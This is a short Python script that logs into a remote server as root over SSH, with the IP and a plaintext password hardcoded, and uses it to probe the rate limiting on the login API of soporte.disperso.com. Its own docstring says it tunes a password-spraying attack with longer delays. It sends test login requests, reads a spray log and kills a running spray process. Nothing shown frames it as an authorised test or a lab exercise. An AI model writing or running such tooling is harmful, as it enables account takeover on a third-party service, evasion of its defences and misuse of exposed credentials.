"""Check 429 details and adjust spray with longer delay."""
import paramiko, time

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('64.177.83.195', username='root', password='Nm9.#p)WzifT.fo2', timeout=20)
print("[+] Connected")

def run(client, cmd, timeout=30):
    _, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode().strip()
    err = stderr.read().decode().strip()
    return out, err

# First check 429 details - Retry-After header?
print("[*] Checking 429 details...")
out, _ = run(client, 'curl -ski -X POST https://soporte.disperso.com/api/auth/login -H "Content-Type: application/json" -d \'{"email":"test@test.com","password":"test"}\' --max-time 10 2>&1 | head -30')
print(f"  First request:\n{out[:500]}")

time.sleep(2)
out, _ = run(client, 'curl -ski -X POST https://soporte.disperso.com/api/auth/login -H "Content-Type: application/json" -d \'{"email":"test2@test.com","password":"test"}\' --max-time 10 2>&1 | head -30')
print(f"  Second request:\n{out[:500]}")

time.sleep(2)
out, _ = run(client, 'curl -ski -X POST https://soporte.disperso.com/api/auth/login -H "Content-Type: application/json" -d \'{"email":"test3@test.com","password":"test"}\' --max-time 10 2>&1 | head -30')
print(f"  Third request:\n{out[:500]}")

# Check current log
out, _ = run(client, 'tail -20 /tmp/spray_out.log')
print(f"\n[*] Current log tail:\n{out}")

# Kill old process
out, _ = run(client, 'kill $(pgrep -f spray_soporte) 2>/dev/null; echo killed')
print(f"[*] Kill: {out}")

client.close()
